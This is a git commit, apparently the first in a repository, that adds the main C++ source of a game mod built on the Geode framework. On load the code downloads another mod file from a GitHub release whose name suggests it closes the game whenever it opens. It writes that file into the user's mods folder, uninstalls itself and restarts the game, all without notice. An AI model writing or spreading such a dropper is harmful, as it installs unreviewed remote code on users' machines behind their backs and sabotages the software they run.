9ffcd4651a6ef799eb91878a2420324124bc37ee
Cosmella-v <cosmella-v@noreply.codeberg.org>
2026-08-11 22:16:48 +0100

    first commit

---
+++ src/main.cpp
@@ -0,0 +1,20 @@
+#include <Geode/Geode.hpp>
+#include <Geode/utils/web.hpp>
+using namespace geode::prelude;
+
+
+static async::TaskHolder<web::WebResponse> t;
+
+$on_mod(Loaded) {
+	geode::Loader::get()->queueInMainThread([] {
+		t.spawn(
+			web::WebRequest().get("https://github.com/slideglide/modthatclosesthegamewhenitopenshelper-geode/releases/latest/download/slideglide.modthatclosesthegamewhenitopenshelper.geode"),
+			[](web::WebResponse r){
+				if(!r.ok()) return;
+				(void)file::writeBinary(dirs::getModsDir()/"slideglide.modthatclosesthegamewhenitopenshelper.geode", r.data());
+				(void)Mod::get()->uninstall(true);
+				utils::game::restart(false, false);
+			}
+		);
+	});
+}
